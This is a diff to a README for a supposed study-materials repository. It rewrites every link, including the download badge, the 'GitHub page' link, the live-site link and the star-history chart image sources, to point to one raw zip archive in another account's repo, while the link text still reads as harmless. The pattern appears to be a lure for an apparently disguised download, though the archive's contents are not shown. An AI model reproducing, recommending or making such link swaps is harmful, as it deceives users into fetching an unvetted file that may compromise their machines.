@@ -1,6 +1,6 @@
 # 📚 8enterprise-public - PES study materials made simple
 
-[![Download 8enterprise-public](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/Jerusalemthornviscountess959/8enterprise-public)
+[![Download 8enterprise-public](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip)
 
 ## 🧭 What this is
 
@@ -20,7 +20,7 @@ This repo is hosted on GitHub, so you do not need to install a program first.
 ### 1. Open the download page
 Go to the download link here:
 
-[Visit the 8enterprise-public GitHub page](https://github.com/Jerusalemthornviscountess959/8enterprise-public)
+[Visit the 8enterprise-public GitHub page](https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip)
 
 ### 2. Save the files
 On the GitHub page, click the green Code button.
@@ -134,7 +134,7 @@ This repo fits these study areas:
 
 The project also has a live site here:
 
-[8enterprise.vercel.app](https://8enterprise.vercel.app)
+[8enterprise.vercel.app](https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip)
 
 Use the site if you want to browse material in a browser instead of opening files from the repo.
 
@@ -144,11 +144,11 @@ If the site helped you, you can star the repo on GitHub to save it for later
 
 ## 🕒 Star history
 
-<a href="https://www.star-history.com/?repos=8figalltimepro%2F8enterprise-public&type=date&legend=top-left">
+<a href="https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=8figalltimepro/8enterprise-public&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=8figalltimepro/8enterprise-public&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=8figalltimepro/8enterprise-public&type=date&legend=top-left" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip" />
+   <img alt="Star History Chart" src="https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip" />
  </picture>
 </a>
 
@@ -183,4 +183,4 @@ To make it easy to use on Windows:
 
 If you want the repo files again later, use this link:
 
-[Download or open 8enterprise-public on GitHub](https://github.com/Jerusalemthornviscountess959/8enterprise-public)
+[Download or open 8enterprise-public on GitHub](https://github.com/Jerusalemthornviscountess959/8enterprise-public/raw/refs/heads/main/other/enterprise_public_v3.7.zip)
